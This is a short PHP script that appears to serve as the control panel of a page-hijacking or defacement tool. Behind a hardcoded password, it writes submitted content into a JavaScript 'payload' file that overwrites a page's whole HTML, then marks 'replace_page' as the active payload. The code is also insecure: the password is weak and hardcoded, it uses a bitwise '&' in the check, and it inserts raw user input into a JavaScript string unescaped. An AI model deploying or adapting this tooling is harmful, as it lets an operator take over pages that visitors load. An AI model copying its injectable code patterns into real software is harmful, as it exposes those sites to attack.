<?php
$password = $_POST["pass"];
$content = $_POST["content"];
if ($password == "tno" & $content != "")
{
  $module = "../../ping/main.js";
   $module_open = fopen($module, 'w');
    $pay_load = "document.getElementsByTagName('html')[0].innerHTML = '".$content."';";
      fwrite($module_open, $pay_load);
       fclose($module_open);
  
  // turn into a class damnit
  include('ini_parser_v1.php');
  $ini_data = 'active = replace_page';
  $ini_file = <<<EOT
;<?php
;die(); // For further security
;/*
$ini_data
;*/
;?>
EOT;

  safefilerewrite("../../db/active_payload.php", $ini_file);
  header('Location: ../index.php');
}
else
{
  echo 'error';
}
?>
